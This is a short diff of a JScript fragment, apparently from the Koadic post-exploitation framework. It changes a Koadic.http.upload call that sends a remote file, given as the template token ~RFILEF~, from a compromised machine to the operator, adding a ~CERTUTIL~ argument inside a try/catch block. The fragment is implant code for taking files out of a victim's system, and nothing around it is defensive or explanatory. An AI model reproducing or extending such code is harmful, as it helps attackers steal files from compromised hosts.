@@ -1,6 +1,6 @@
 try
 {
-    Koadic.http.upload("~RFILEF~", "data");
+    Koadic.http.upload("~RFILEF~", "data", ~CERTUTIL~);
 }
 catch (e)
 {
